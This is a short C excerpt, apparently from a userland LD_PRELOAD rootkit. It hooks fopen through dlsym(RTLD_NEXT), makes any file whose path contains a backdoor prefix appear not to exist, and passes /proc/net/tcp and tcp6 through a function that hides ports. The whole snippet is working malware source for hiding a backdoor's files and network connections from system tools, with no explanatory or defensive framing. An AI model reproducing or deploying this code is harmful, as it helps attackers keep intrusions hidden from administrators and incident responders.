FILE *fopen(const char *pathname, const char *mode) {
	if (!orig_fopen)
		orig_fopen = dlsym(RTLD_NEXT,"fopen");
	if (debug == 1)
		printf("\nfopen : %s\n", pathname);
    
	if (strstr(pathname, BDS_PREFIX)) {
		errno = ENOENT;
		return NULL;    
	}
    
	if (strcmp (pathname, "/proc/net/tcp") == 0 || strcmp (pathname, "/proc/net/tcp6") == 0)
		return hide_port(pathname);
    
	return orig_fopen(pathname, mode);
}